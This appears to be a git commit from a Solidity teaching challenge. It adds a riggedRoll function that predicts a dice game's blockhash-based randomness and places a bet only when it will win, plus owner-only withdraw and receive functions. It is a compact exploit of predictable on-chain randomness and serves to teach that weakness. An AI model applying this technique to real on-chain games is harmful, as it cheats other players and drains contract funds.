18a6c8c045048e853f36933d0dc8067252b58209
phamhoanggiang24062004 <137171900+phamhoanggiang24062004@users.noreply.github.com>
2025-12-23 14:17:59 +0700

    create riggedRoll, withdraw and receive function

--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -13,8 +13,29 @@ contract RiggedRoll is Ownable {
     }
 
     // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
+    function withdraw(address payable to) external onlyOwner {
+        uint256 balance = address(this).balance;
+        require(balance > 0, "No ETH to withdraw");
+        to.transfer(balance);
+    }
 
     // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
+    function riggedRoll() external {
+        uint256 predictedRoll = uint256(
+            keccak256(
+                abi.encodePacked(
+                    blockhash(block.number - 1),
+                    address(this)
+                )
+            )
+        ) % 16;
+
+        // Only roll if it will win
+        if (predictedRoll <= 2) {
+            diceGame.rollTheDice{value: 0.002 ether}();
+        }
+    }
 
     // Include the `receive()` function to enable the contract to receive incoming Ether.
+    receive() external payable {}
 }
